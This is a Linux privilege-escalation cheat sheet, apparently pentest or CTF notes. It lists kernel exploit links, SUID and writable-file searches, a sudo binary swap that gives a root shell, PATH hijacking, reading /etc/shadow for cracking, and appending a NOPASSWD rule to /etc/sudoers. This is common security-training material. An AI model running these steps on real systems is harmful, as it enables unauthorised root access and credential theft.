####Detailed guide
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

####Tools
+ LinEnum.sh
+ linuxprivchecker.py
+ unix-privesc-check

####Easy exploits

Kernel 2.4/2.6 sock_sendpage()    
https://www.exploit-db.com/exploits/9479/

Kernel 2.6.17 <= 2.6.24.1 vmsplice    
https://www.exploit-db.com/exploits/5092/

Kernel <= 2.6.36-rc8    
https://www.exploit-db.com/exploits/15285/

####Initial recon
#####1. Identify current user    
`id`    
`whoami`

#####2. Check for sudo privileges    
`sudo -l`

+ If a program in the list is writable move it and create a soft link to `/bin/bash`

+ If `chown` is usable, use it run another usable program
```
$ cd /tmp/   
$ cp /bin/bash .
$ sudo chown root:root /tmp/bash
$ sudo mv /bin/<other> /bin/<other>.orig
$ sudo mv /tmp/bash /bin/<other>
$ sudo /bin/<other>
id
uid=0(root) gid=0(root) groups=0(root)
```

+ If allowed commands have wildcards (e.g. /bin/cat /<dir>/*) you can use directory traversal
`sudo /bin/cat /<dir>/../<anything>`

#####3. Identify version
`uname -a`    
`cat /etc/issue`

#####4. Find files
+ Writable files    
`sudo find / -perm -2 ! -type l -ls`    
`find / -perm -g=s -o -perm -0777 ! -type l -maxdepth 6 -exec ls -ld {} \; 2>/dev/null`
+ SUID binaries    
`find / -perm -4000 -type f 2>/dev/null`     
`find / -perm -u=s -type f 2>/dev/null`    
`find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 6 -exec ls -ld {} \; 2>/dev/null`
+ SUID binaries (owned by root)    
`find / -user root -perm -4000 -print 2>/dev/null`
+ Files owned by user    
`find / -user <user> 2>/dev/null`    
+ Odd permissions    
`find / -perm -2 ! -type l -ls -xdev 2>/dev/null`    
+ Files matching wildcards    
`find / -name *<pattern>* 2>/dev/null`  
+ Files matching wildcards (owned by root)    
`find / -user root -name "*<pattern>*" -exec ls -ld {} \; 2>/dev/null`    
`find / -user root -name "*<pattern>*" | grep -v "Permission denied"`

Use `getfacl` to see file access control lists

#####5. Look for programs listening on a port
`netstat -antup`    
`netstat -antop | grep LISTEN`

#####6. Look for programs running as root    
`ps aux | grep root`

If a program is executed as part of a cronjob or a SUID program executes another with a relative path
```
export PATH=<current path>:$PATH
printf '#!/bin/bash\n/bin/bash' > <current path>/<filename>
```

##Interesting files

+ passwd and shadow files to crack passwords    
`cat /etc/passwd`    
`cat /etc/shadow`    
+ group file to see which users are in groups `sudo` and `wheel`    
`cat /etc/group`
+ crontab file with scheduled jobs    
`cat /etc/crontab`
+ cronjob files    
`ls -lah /etc/cron.d/`
+ Users allowed to do rlogin, if possible add user    
`.rhosts`
+ IPs to visited webpages    
`/etc/hosts`
+ Read bash history    
`/home/<user>/.bash_history`
+ DNS file, if it is writable it can be made to point to any server    
`/etc/resolv.conf`
+ sudoers file, if it is writable, add current user all programs     
`echo 'apophis ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers`
+ User files    
`ls -lah /home/<user>`

Look for readable user directories for .ssh private keys id_rsa

##Finding a program with a string on it
```bash
find / -executable > exes
for f in $(cat exes); do echo $f >> output; strings $f | grep "<string>" >> output; done
grep "<string>" output -B1
```
